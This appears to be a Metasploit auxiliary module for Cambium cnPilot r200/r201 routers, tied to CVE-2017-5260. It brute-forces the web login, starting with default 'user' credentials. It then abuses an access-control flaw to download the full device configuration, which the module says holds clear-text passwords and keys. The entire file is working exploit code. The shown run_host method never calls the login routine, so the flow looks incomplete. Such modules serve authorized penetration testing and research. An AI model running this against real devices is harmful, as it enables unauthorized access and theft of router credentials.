##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::CNPILOT

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Cambium cnPilot r200/r201 Login Scanner and Config Dump',
      'Description' => %{
        This module scans for Cambium cnPilot r200/r201 management login
        portal(s), attempts to identify valid credentials, and dump device
        configuration.

        The device has at least two (2) users - admin and user. Due to an
        access control vulnerability, it is possible for 'user' account to access full
        device config. All information, including passwords, and keys, is stored
        insecurely, in clear-text form, thus allowing unauthorized admin access to any
        user.
      },
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'References' =>
        [
          ['CVE', '2017-5260'],
          ['URL', 'https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']
        ],
      'License' => MSF_LICENSE
     )
    )

    register_options(
      [
        OptInt.new('TIMEOUT', [true, 'HTTP connection timeout', 10]),
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'user']),
        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'user'])
      ], self.class
    )
  end

  def run_host(ip)
    unless is_app_cnpilot?
      return
    end
  end

  #
  # Login & initiate dump_config
  #

  def run_login
    each_user_pass do |user, pass|
      cookie = do_login(user, pass)
      if cookie == 'skip'
        # do nothing
      else
        dump_config(cookie)
      end
    end
  end

  #
  # Dump device configuration
  #

  def dump_config(the_cookie)
    res = send_request_cgi(
      {
        'uri' => '/goform/down_cfg_file',
        'method' => 'GET',
        'cookie' => the_cookie,
        'headers' => {
          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
      }
    )

    if res && res.code == 200 && res.headers['content-disposition']
      print_status("#{rhost}:#{rport} - dumping device configuration")
      print_good("#{rhost}:#{rport} - Configfile.cfg retrieved successfully!")
      loot_name = 'Configfile.cfg'
      loot_type = 'text/plain'
      loot_desc = 'Cambium cnPilot Config'
      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body, loot_desc)
      print_good("#{rhost}:#{rport} - File saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to retrieve config. Set a higher HTTPCLIENTTIMEOUT and try again.")
      return
    end
  end
end
